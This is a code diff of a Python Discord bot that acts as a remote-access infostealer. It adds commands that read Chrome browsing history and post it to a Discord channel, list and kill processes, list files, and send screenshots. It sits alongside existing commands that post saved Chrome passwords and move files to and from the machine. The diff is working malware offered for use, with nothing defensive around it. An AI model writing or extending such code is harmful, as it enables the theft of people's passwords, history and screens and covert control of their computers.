@@ -14,12 +14,17 @@ import tempfile
 import asyncio
 from PIL import ImageGrab
 import io
+import psutil
+import subprocess
+import platform
+import win32gui
+from datetime import date
 
-bot = commands.Bot(command_prefix=";", intents=discord.Intents.all())
+bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name} ({bot.user.id})')
+    print("logged in \isudg")
 
 @bot.command()
 async def ping(ctx):
@@ -29,6 +34,41 @@ async def ping(ctx):
 @bot.command()
 async def clear(ctx, amt):
     await ctx.channel.purge(limit = int(amt) + 1)
+
+
+def get_chrome_history():
+    if platform.system() == 'Windows':
+        history_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\History')
+    elif platform.system() == 'Darwin':
+        history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
+    else:
+        history_path = os.path.expanduser('~/.config/google-chrome/Default/History')
+
+    connection = sqlite3.connect(history_path)
+    cursor = connection.cursor()
+
+    cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC')
+
+    history_items = cursor.fetchall()
+
+    history_data = ""
+    for item in history_items:
+        url, title, visit_count, last_visit_time = item
+        history_data += f"Title: {title}\nURL: {url}\nVisits: {visit_count}\n\n"
+
+    connection.close()
+
+    return history_data if history_data else "No history found."
+
+def split_message(message, max_length=400):
+    return [message[i:i + max_length] for i in range(0, len(message), max_length)]
+
+def has_window(proc):
+    try:
+        handle = win32gui.GetForegroundWindow()
+        return proc.pid == win32gui.GetWindowThreadProcessId(handle)[1]
+    except (psutil.NoSuchProcess, psutil.AccessDenied):
+        return False
 
 @bot.command()
 async def grab(ctx, info, description='Grabs info on computer'):
@@ -112,30 +152,80 @@ async def grab(ctx, info, description='Grabs info on computer'):
                     conn.close()
                     os.remove("Loginvault.db")
 
-            # Step 2: Write fetched data into a temp text file
             temp_file_path = os.path.join(tempfile.gettempdir(), 'grabbed_data.txt')
             with open(temp_file_path, 'w') as temp_file:
                 temp_file.write('\n'.join(info_list))
 
-            # Step 3: Read the temp text file
             with open(temp_file_path, 'r') as temp_file:
                 info_str = temp_file.read()
 
-            # Step 4: Put the contents of the temp text file into an embed
             embed = discord.Embed(
                 title='Saved Chrome Passwords',
                 description=info_str,
                 color=discord.Color.blue() 
             )
 
-            # Step 5: Send the embed
             await ctx.send(embed=embed)
-
-            # Optional: Delete the temp text file after use
             os.remove(temp_file_path)
             
         except Exception as e:
             print("[ERR] %s"%str(e))
+
+
+
+        os.remove(temp_file_path)
+
+
+    if info == "history":
+        history = get_chrome_history()
+        temp_file_path = os.path.join(os.path.expanduser('~'), 'history.txt')
+        
+        with open(temp_file_path, 'w', encoding='utf-8') as file:
+            file.write(history)
+
+        if len(history) < 2000:
+            embed = discord.Embed(
+                title="Browser History",
+                description=history,
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send(file=discord.File(temp_file_path))
+
+        os.remove(temp_file_path)
+
+@bot.command()
+async def show(ctx, whattoshow):
+    if whattoshow == "processes":
+        processes = []
+        
+        for proc in psutil.process_iter(['pid', 'name']):
+            if has_window(proc):
+                try:
+                    process_name = proc.info['name']
+                    processes.append(process_name)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+        
+        process_list = "\n".join(processes[:100]) if processes else "No processes found."
+        
+        await ctx.send(f"```User-Visible Processes (Names Only):\n{process_list}```")
+
+@bot.command()
+async def kill(ctx, task: str):
+    command = ["taskkill", "/IM", task]
+    try:
+        result = subprocess.run(command, capture_output=False, text=True, shell=True)
+
+        if result.returncode == 0:
+            await ctx.send(f"```{task} has been sucessfully terminated.```")
+        else:
+            await ctx.send(f"{task} could not be terminated: {result.stderr}")
+
+    except Exception as e:
+        await ctx.send("An error occoured: ", (e))
+    
 
 @bot.command()
 async def download(ctx, file_path):
@@ -151,11 +241,11 @@ async def download(ctx, file_path):
 async def upload(ctx, num_of_files: int):
     # Check if the user provided a valid number of files
     if num_of_files <= 0:
-        await ctx.send("Please provide a valid number of files to upload.")
+        await ctx.send("```Please provide a valid number of files to upload.```")
         return
 
     # Request files from the user
-    await ctx.send(f"Please send {num_of_files} file(s) here that you want to upload.")
+    await ctx.send(f"```Please send {num_of_files} file(s) here that you want to upload.```")
 
     def check(message):
         return message.author == ctx.author and message.channel == ctx.channel and message.attachments
@@ -185,12 +275,29 @@ async def ss(ctx):
         screenshot.save(image_bytes, format='PNG')
         image_bytes.seek(0)
 
-        # Send the screenshot as a file
-        await ctx.send(file=discord.File(image_bytes, filename='screenshot.png'))
+        discord_file = discord.File(image_bytes, filename='screenshot.png')
+
+        # Create an embed object
+        embed = discord.Embed(title=f"Screenshot ({date.today()})")
+        embed.set_image(url="attachment://screenshot.png")
+        embed.color=discord.Color.red()
+
+        # Send the embed with the screenshot attached
+        await ctx.send(file=discord_file, embed=embed)
     except Exception as e:
         await ctx.send(f"Error: {e}")
 
-token = "TOKEN"
+
+
+
+@bot.command()
+async def ls(ctx):
+    files = []
+    for file in os.listdir():
+        files.append(file)
+    await ctx.send(f"```{files}```")
+
+token = 'TOKEN'
 d_token = base64.b64decode(token)
 
 
